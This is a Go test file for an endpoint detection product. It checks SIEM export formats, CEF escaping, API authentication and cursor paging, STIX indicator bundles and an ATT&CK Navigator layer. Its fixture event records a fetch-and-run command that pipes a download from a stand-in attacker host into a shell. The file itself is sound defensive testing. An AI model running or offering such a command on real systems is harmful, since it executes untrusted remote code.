// SPDX-License-Identifier: LicenseRef-Zyvor-Production-1.0
package edr

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
	"time"
)

func siemFixture() (Finding, Event) {
	ev := Event{ID: "e1", Time: time.Date(2026, 1, 2, 3, 4, 5, 123000000, time.UTC), Host: "web-01", PID: 4242, PPID: 1, UID: 1000,
		Executable: "/usr/bin/curl", ParentExe: "/bin/bash", Command: "curl http://evil.example/x | sh"}
	f := Finding{ID: "f1", Time: ev.Time, Host: "web-01", PID: 4242, Rule: "ransomware-burst", Severity: "high",
		Description: "Burst of file encryption | a=b", Evidence: ev, Tags: []string{"ransomware", "t1486"}, Destination: "203.0.113.9"}
	return f, ev
}

func golden(t *testing.T, name, got string) {
	t.Helper()
	p := filepath.Join("testdata", "siem", name)
	if os.Getenv("KAVACH_UPDATE_GOLDEN") == "1" {
		if err := os.WriteFile(p, []byte(got), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	want, err := os.ReadFile(p)
	if err != nil {
		t.Fatal(err)
	}
	if string(want) != got {
		t.Fatalf("%s mismatch\n got: %s\nwant: %s", name, got, want)
	}
}

func TestSIEMGoldenFormats(t *testing.T) {
	f, ev := siemFixture()
	for _, format := range []string{"ocsf", "ecs", "cef", "leef", "splunk-hec"} {
		golden(t, format+"-finding.golden", renderSIEMLine(format, siemRec{Time: f.Time, ID: f.ID, F: &f})+"\n")
		golden(t, format+"-event.golden", renderSIEMLine(format, siemRec{Time: ev.Time, ID: eventRecID(ev), E: &ev})+"\n")
	}
}

func TestSIEMJSONFormatsAreValidAndTyped(t *testing.T) {
	f, _ := siemFixture()
	for _, format := range []string{"ocsf", "ecs", "splunk-hec"} {
		line := renderSIEMLine(format, siemRec{Time: f.Time, ID: f.ID, F: &f})
		var m map[string]any
		if err := json.Unmarshal([]byte(line), &m); err != nil || strings.Contains(line, "\n") {
			t.Fatalf("%s not single-line JSON: %v", format, err)
		}
	}
	var o map[string]any
	_ = json.Unmarshal([]byte(renderSIEMLine("ocsf", siemRec{Time: f.Time, ID: f.ID, F: &f})), &o)
	if o["class_uid"].(float64) != 2004 || o["type_uid"].(float64) != 200401 || o["severity_id"].(float64) != 4 {
		t.Fatalf("ocsf ids: %v", o)
	}
}

func TestCEFEscaping(t *testing.T) {
	f, _ := siemFixture()
	f.Rule, f.Description, f.Evidence.Command = "a|b", "x=y\nz\\", "k=v"
	line := cefLine(siemRec{Time: f.Time, ID: f.ID, F: &f})
	if !strings.HasPrefix(line, `CEF:0|Zyvor AI Labs|Kavach|1.0|a\|b|a\|b|8|`) || !strings.Contains(line, `msg=x\=y\nz\\`) || !strings.Contains(line, `cs1=k\=v`) {
		t.Fatal(line)
	}
	if strings.Contains(line, "\n") {
		t.Fatal("newline leaked")
	}
}

func siemTestAPI(t *testing.T) (http.Handler, *Store) {
	t.Helper()
	store, err := NewStore(filepath.Join(t.TempDir(), "f.jsonl"), 100)
	if err != nil {
		t.Fatal(err)
	}
	return API("tok", store), store
}

func siemGet(h http.Handler, path string, auth bool) *httptest.ResponseRecorder {
	req := httptest.NewRequest("GET", path, nil)
	if auth {
		req.Header.Set("Authorization", "Bearer tok")
	}
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)
	return rec
}

func TestSIEMEndpointAuthValidationAndCursor(t *testing.T) {
	h, store := siemTestAPI(t)
	for _, p := range []string{"/v1/export/findings?format=ocsf", "/v1/export/iocs?format=stix", "/v1/export/attack-layer"} {
		if c := siemGet(h, p, false).Code; c != 401 {
			t.Fatalf("%s unauth = %d", p, c)
		}
	}
	for _, p := range []string{"/v1/export/findings?format=cef&limit=0", "/v1/export/findings?format=cef&since=bad",
		"/v1/export/findings?format=cef&cursor=%25%25", "/v1/export/findings?format=cef&kind=x", "/v1/export/iocs?format=csv"} {
		if c := siemGet(h, p, true).Code; c != 400 {
			t.Fatalf("%s = %d", p, c)
		}
	}
	// legacy formats still work
	if c := siemGet(h, "/v1/export/findings?format=csv", true).Code; c != 200 {
		t.Fatalf("legacy csv = %d", c)
	}
	base := time.Date(2026, 1, 2, 3, 4, 5, 0, time.UTC)
	for i, id := range []string{"a", "b", "c", "d", "e"} {
		ts := base.Add(time.Duration(i/2) * time.Second) // pairs share a timestamp
		if err := store.Append(Finding{ID: id, Time: ts, Host: "h", Rule: "ransomware-burst", Severity: "low"}); err != nil {
			t.Fatal(err)
		}
	}
	var ids []string
	cursor := ""
	for page := 0; page < 10; page++ {
		rec := siemGet(h, "/v1/export/findings?format=splunk-hec&limit=2&cursor="+cursor, true)
		if rec.Code != 200 {
			t.Fatal(rec.Code, rec.Body.String())
		}
		if rec.Header().Get("X-Kavach-Count") == "0" {
			if rec.Header().Get("X-Kavach-Next-Cursor") != cursor {
				t.Fatal("empty page must echo cursor")
			}
			break
		}
		for _, l := range strings.Split(strings.TrimSpace(rec.Body.String()), "\n") {
			var m struct{ Event Finding }
			if err := json.Unmarshal([]byte(l), &m); err != nil {
				t.Fatal(err)
			}
			ids = append(ids, m.Event.ID)
		}
		cursor = rec.Header().Get("X-Kavach-Next-Cursor")
	}
	if strings.Join(ids, "") != "abcde" {
		t.Fatalf("cursor paging produced %v (want a..e once each)", ids)
	}
}

func TestSIEMEventsKind(t *testing.T) {
	h, store := siemTestAPI(t)
	if _, err := store.Ingest(Event{ID: "ev1", Time: time.Now().UTC(), Host: "h", PID: 7, Executable: "/bin/ls", Command: "ls"}); err != nil {
		t.Fatal(err)
	}
	rec := siemGet(h, "/v1/export/findings?format=ocsf&kind=events", true)
	if rec.Code != 200 || !strings.Contains(rec.Body.String(), `"class_uid":1007`) {
		t.Fatal(rec.Code, rec.Body.String())
	}
}

var stixIDRe = regexp.MustCompile(`^[a-z0-9-]+--[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$`)
var stixTSRe = regexp.MustCompile(`^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(\.\d+)?Z$`)

func TestSTIXBundleStructure(t *testing.T) {
	now := time.Date(2026, 3, 1, 0, 0, 0, 0, time.UTC)
	list := []IOC{
		{ID: "1", Type: "sha256", Value: strings.Repeat("a", 64), Severity: "high", Description: "bad file", Source: "manual", CreatedAt: now.Add(-time.Hour), Enabled: true},
		{ID: "2", Type: "domain", Value: "evil.example", Severity: "low", Source: "feed-x", Enabled: true},
		{ID: "3", Type: "ipv4", Value: "203.0.113.9", Enabled: false},
		{ID: "4", Type: "weird", Value: "zzz", Enabled: true},
		{ID: "5", Type: "url", Value: "http://e/x'y", Enabled: true},
	}
	b := buildSTIXBundle(list, now)
	raw, _ := json.Marshal(b)
	var back struct {
		Type    string           `json:"type"`
		ID      string           `json:"id"`
		Objects []map[string]any `json:"objects"`
	}
	if err := json.Unmarshal(raw, &back); err != nil {
		t.Fatal(err)
	}
	if back.Type != "bundle" || !stixIDRe.MatchString(back.ID) || !strings.HasPrefix(back.ID, "bundle--") {
		t.Fatalf("bundle %v", back.ID)
	}
	if len(back.Objects) != 4 { // identity + 3 valid enabled indicators
		t.Fatalf("objects=%d", len(back.Objects))
	}
	seen := map[string]bool{}
	for _, o := range back.Objects {
		id, _ := o["id"].(string)
		typ, _ := o["type"].(string)
		if !stixIDRe.MatchString(id) || !strings.HasPrefix(id, typ+"--") || seen[id] || o["spec_version"] != "2.1" {
			t.Fatalf("bad object %v", o)
		}
		seen[id] = true
		for _, k := range []string{"created", "modified"} {
			if s, _ := o[k].(string); !stixTSRe.MatchString(s) {
				t.Fatalf("%s %v", k, o)
			}
		}
		if typ == "indicator" {
			for _, k := range []string{"pattern", "pattern_type", "valid_from"} {
				if o[k] == nil {
					t.Fatalf("indicator missing %s", k)
				}
			}
			if s, _ := o["valid_from"].(string); !stixTSRe.MatchString(s) {
				t.Fatal(s)
			}
			if p := o["pattern"].(string); !strings.HasPrefix(p, "[") || !strings.HasSuffix(p, "]") || o["created"].(string) > o["modified"].(string) {
				t.Fatal(p)
			}
		}
	}
	if !strings.Contains(string(raw), `[url:value = 'http://e/x\\'y']`) || !strings.Contains(string(raw), `file:hashes.'SHA-256'`) {
		t.Fatal(string(raw))
	}
	b2, _ := json.Marshal(buildSTIXBundle(list, now.Add(time.Hour)))
	if !strings.Contains(string(b2), back.Objects[1]["id"].(string)) {
		t.Fatal("indicator id not stable")
	}
	h, _ := siemTestAPI(t)
	rec := siemGet(h, "/v1/export/iocs?format=stix", true)
	if rec.Code != 200 || !strings.HasPrefix(rec.Header().Get("Content-Type"), "application/stix+json") || !strings.Contains(rec.Body.String(), `"type":"bundle"`) {
		t.Fatal(rec.Code, rec.Header())
	}
}

func TestNavigatorLayer(t *testing.T) {
	h, store := siemTestAPI(t)
	_ = store.Append(Finding{ID: "x", Time: time.Now(), Host: "h", Rule: "ransomware-burst", Severity: "high"})
	rec := siemGet(h, "/v1/export/attack-layer", true)
	if rec.Code != 200 {
		t.Fatal(rec.Code)
	}
	var l struct {
		Name       string
		Domain     string
		Versions   map[string]string
		Techniques []struct {
			TechniqueID string
			Tactic      string
			Score       int
			Color       string
		}
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &l); err != nil {
		t.Fatal(err)
	}
	if l.Name == "" || l.Domain != "enterprise-attack" || l.Versions["layer"] != "4.5" || len(l.Techniques) == 0 {
		t.Fatalf("layer %+v", l)
	}
	tid := regexp.MustCompile(`^T\d{4}(\.\d{3})?$`)
	hit := false
	for _, x := range l.Techniques {
		if !tid.MatchString(x.TechniqueID) || x.Tactic != strings.ToLower(x.Tactic) || strings.Contains(x.Tactic, " ") {
			t.Fatalf("bad technique %+v", x)
		}
		if x.TechniqueID == "T1486" && x.Score >= 1 && x.Color == "#fb6a4a" {
			hit = true
		}
	}
	if !hit {
		t.Fatal("observed hit for T1486 missing")
	}
}
